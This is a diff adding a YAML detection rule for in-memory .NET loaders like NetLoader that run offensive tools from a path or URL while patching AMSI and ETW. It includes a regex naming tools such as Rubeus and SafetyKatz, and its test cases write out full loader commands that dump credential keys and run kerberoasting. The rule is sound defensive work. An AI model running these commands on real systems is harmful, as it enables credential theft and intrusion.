@@ -1,0 +1,36 @@
+id: DL-0033
+title: In-memory .NET loader runs an offensive tool
+description: >
+  Loaders such as NetLoader take a path or URL to a .NET assembly, patch AMSI and ETW, and
+  run the tool from memory so it never touches disk (Loader.exe -path ... -args ...). The
+  tool names usually stay visible in the arguments.
+attack: [T1620, T1562.001, T1027]
+tactic: defense-evasion
+severity: high
+logsource: process_creation
+detection:
+  loader_syntax:
+    process.command_line|contains|all: ['-path', '-args']
+  remote_or_tool:
+    process.command_line|re: '(https?://|\\\\|rubeus|safetykatz|certify|sharphound|seatbelt|standin|sharpup|winpeas)'
+  netloader:
+    process.command_line|contains: [netloader, 'loader.exe -path']
+  condition: (loader_syntax and remote_or_tool) or netloader
+false_positives:
+  - Rare. Some deployment tools accept -path and -args; they do not point at offensive assemblies.
+triage:
+  - The URL in -path is often a local port forward (netsh portproxy, DL-0035) to the attacker's server. Find the listener.
+  - Read the -args value. It tells you which tool ran and what it did (DL-0031 for Rubeus, DL-0019 for SafetyKatz).
+tests:
+  match:
+    - process.name: loader.exe
+      process.command_line: 'C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"'
+    - process.name: loader.exe
+      process.command_line: 'Loader.exe -path \\10.0.0.5\share\Rubeus.exe -args kerberoast'
+  no_match:
+    - process.name: msiexec.exe
+      process.command_line: 'msiexec /i agent.msi /qn'
+    - process.name: setup.exe
+      process.command_line: 'setup.exe -path C:\Program Files\App -args /silent'
+references:
+  - https://github.com/Flangvik/NetLoader
